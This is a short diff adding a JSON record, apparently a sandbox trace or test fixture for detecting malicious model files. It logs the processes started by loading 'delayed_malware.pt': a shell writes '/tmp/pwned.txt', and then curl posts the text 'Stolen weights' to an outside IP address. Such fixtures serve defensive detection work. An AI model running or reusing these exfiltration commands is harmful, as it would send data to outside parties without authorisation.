@@ -1,0 +1,30 @@
+{
+  "processes": [
+    {
+      "binary": "/opt/gemma-backend/sandbox/venv/bin/python3",
+      "command": "python3 run_model.py delayed_malware.pt"
+    },
+    {
+      "binary": "/bin/sh",
+      "command": "sh -c -- echo 'Malware Triggered!' > /tmp/pwned.txt"
+    },
+    {
+      "binary": "/bin/sh",
+      "command": "sh -c -- curl -s http://93.184.216.34/ -d 'Stolen weights' > /dev/null"
+    },
+    {
+      "binary": "/usr/bin/curl",
+      "command": "curl -s http://93.184.216.34/ -d Stolen weights"
+    }
+  ],
+  "files_written": [
+    "/tmp/pwned.txt",
+    "/dev/null"
+  ],
+  "network_connections": [
+    {
+      "destination_ip": "93.184.216.34",
+      "port": 80
+    }
+  ]
+}
